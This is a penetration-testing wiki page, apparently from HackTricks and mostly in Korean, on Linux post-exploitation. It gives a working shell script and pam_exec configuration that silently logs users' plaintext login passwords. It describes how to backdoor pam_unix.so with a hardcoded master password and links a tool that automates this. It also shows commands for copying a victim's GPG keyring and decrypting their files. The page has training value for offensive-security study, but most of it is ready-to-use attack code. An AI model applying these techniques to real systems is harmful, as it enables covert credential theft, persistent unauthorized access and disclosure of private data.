# Linux Post-Exploitation

{{#include ../../banners/hacktricks-training.md}}

## Sniffing Logon Passwords with PAM

각 사용자가 로그인할 때 사용하는 비밀번호를 기록하도록 PAM 모듈을 구성해보자. PAM이 무엇인지 모르면 다음을 확인하라:


{{#ref}}
pam-pluggable-authentication-modules.md
{{#endref}}

**For further details check the [original post](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)**. This is just a summary:

**Technique Overview:**
Pluggable Authentication Modules (PAM)은 Unix 기반 시스템에서 인증 관리를 유연하게 해준다. 로그인 프로세스를 맞춤화해 보안을 강화할 수 있으나, 오용될 경우 위험을 초래할 수 있다. 이 요약은 PAM을 사용해 로그인 자격증명을 수집하는 기법과 이에 대한 완화 전략을 개략적으로 설명한다.

**Capturing Credentials:**

- `toomanysecrets.sh`라는 bash 스크립트를 작성하여 로그인 시도(날짜, 사용자 이름(`$PAM_USER`), 패스워드(stdin을 통해 수집), 원격 호스트 IP(`$PAM_RHOST`))를 `/var/log/toomanysecrets.log`에 기록한다.
- 해당 스크립트에 실행 권한을 부여한 뒤 `pam_exec.so` 모듈을 사용해 조용히 실행(run quietly)하고 인증 토큰을 스크립트에 노출(expose the authentication token)하도록 옵션을 설정해 PAM 구성(`common-auth`)에 통합한다.
- 이 접근법은 손상된 Linux 호스트를 이용해 자격증명을 은밀하게 기록할 수 있음을 보여준다.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
sudo nano /etc/pam.d/common-auth
# Add: auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```
### Backdooring PAM

**For further details check the [original post](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)**. 다음은 요약입니다:

Pluggable Authentication Module (PAM)는 Linux에서 사용자 인증에 사용되는 시스템입니다. 이 시스템은 세 가지 주요 개념인 **username**, **password**, 및 **service**로 작동합니다. 각 서비스의 설정 파일은 `/etc/pam.d/` 디렉터리에 위치하며, 여기서 공유 라이브러리가 인증을 처리합니다.

**Objective**: PAM을 수정하여 특정 비밀번호로 인증을 허용하고 실제 사용자 비밀번호를 우회하도록 합니다. 특히 거의 모든 서비스에서 비밀번호 검증을 위해 포함되는 `common-auth` 파일에서 사용되는 `pam_unix.so` 공유 라이브러리에 중점을 둡니다.

### Steps for Modifying `pam_unix.so`:

1. **Locate the Authentication Directive** in the `common-auth` file:
- 비밀번호를 확인하는 책임이 있는 라인이 `pam_unix.so`를 호출합니다.
2. **Modify Source Code**:
- `pam_unix_auth.c` 소스 파일에 미리 정의된 비밀번호가 사용되면 접근을 허용하고, 그렇지 않으면 기존 인증 과정을 계속 진행하도록 하는 조건문을 추가합니다.
3. **Recompile and Replace** the modified `pam_unix.so` library in the appropriate directory.
4. **Testing**:
- 사전 정의된 비밀번호로 로그인, ssh, sudo, su, screensaver 등 다양한 서비스에서 접근이 허용되며, 정상적인 인증 프로세스에는 영향을 주지 않습니다.

> [!TIP]
> You can automate this process with [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)

## Decrypting GPG loot via homedir relocation

암호화된 `.gpg` 파일과 사용자의 `~/.gnupg` 폴더(pubring, private-keys, trustdb)를 찾았지만 GnuPG homedir 권한/잠금 때문에 복호화할 수 없는 경우, 키링을 쓰기 가능한 위치로 복사한 다음 이를 GPG home으로 사용하면 됩니다.

이 작업을 하지 않을 때 보게 되는 일반적인 오류: "unsafe ownership on homedir", "failed to create temporary file", 또는 "decryption failed: No secret key" (GPG가 원본 homedir을 읽거나 쓸 수 없기 때문).

Workflow:
```bash
# 1) Stage a writable homedir and copy the victim's keyring
mkdir -p /dev/shm/fakehome/.gnupg
cp -r /home/victim/.gnupg/* /dev/shm/fakehome/.gnupg/
# 2) Ensure ownership & perms are sane for gnupg
chown -R $(id -u):$(id -g) /dev/shm/fakehome/.gnupg
chmod 700 /dev/shm/fakehome/.gnupg
# 3) Decrypt using the relocated homedir (either flag works)
GNUPGHOME=/dev/shm/fakehome/.gnupg gpg -d /home/victim/backup/secrets.gpg
# or
gpg --homedir /dev/shm/fakehome/.gnupg -d /home/victim/backup/secrets.gpg
```
비밀 키 자료가 `private-keys-v1.d`에 존재하면, GPG는 passphrase를 묻지 않고 잠금 해제하고 복호화합니다(또는 키가 보호되어 있으면 묻습니다).


## 참고자료

- [0xdf – HTB Environment (GPG homedir relocation to decrypt loot)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [GnuPG Manual – Home directory and GNUPGHOME](https://www.gnupg.org/documentation/manuals/gnupg/GPG-Configuration-Options.html#index-homedir)

{{#include ../../banners/hacktricks-training.md}}
